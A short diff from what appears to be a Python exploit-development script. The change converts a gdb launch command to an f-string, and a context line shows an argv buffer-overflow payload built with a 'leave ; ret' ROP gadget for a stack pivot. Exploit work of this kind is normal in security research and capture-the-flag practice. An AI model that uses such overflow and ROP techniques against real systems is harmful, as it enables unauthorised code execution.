@@ -120,7 +120,7 @@ argv_overflow += p32(0x080485c1) # leave ; ret (mov esp, ebp; pop ebp; ret)
 # used, as well as the same command line/argv[0].
 #
 def stack_hunter(commandline, where='_start'):
-    cmd = "bash r.sh gdb --args %s" % (commandline)
+    cmd = f"bash r.sh gdb --args {commandline}"
     with shell.run(cmd) as gdb:
         gdb.send("""
 set prompt
